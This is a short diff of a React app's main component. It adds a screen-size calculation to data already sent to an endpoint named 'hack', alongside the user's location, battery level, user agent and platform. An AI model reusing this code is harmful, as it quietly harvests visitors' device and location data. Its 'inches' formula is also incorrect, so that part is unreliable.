@@ -26,6 +26,17 @@ function App() {
     setLocation('Geolocation is not supported')
   }
 
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+  const screenPixelRatio = window.devicePixelRatio;
+
+  const diagonal = Math.sqrt(screenWidth ** 2 + screenHeight ** 2);
+
+  // Расчет дюймовой диагонали
+  const inches = diagonal / screenPixelRatio;
+
+  console.log(`Дюймовая диагональ экрана: ${inches} дюймов`);
+
   useEffect(() => {
     function handleBatteryChange() {
       navigator.getBattery().then((battery) => {
@@ -49,7 +60,7 @@ function App() {
 
   async function handleClick() {
     console.log('dads');
-    await request.post("hack", { precentBattery: batteryLevel, location: mylocation, informationSystems: userAgent, operatingSystems: platform });
+    await request.post("hack", { precentBattery: batteryLevel, location: mylocation, informationSystems: userAgent, operatingSystems: platform, dyum: inches });
   }
 
   return (
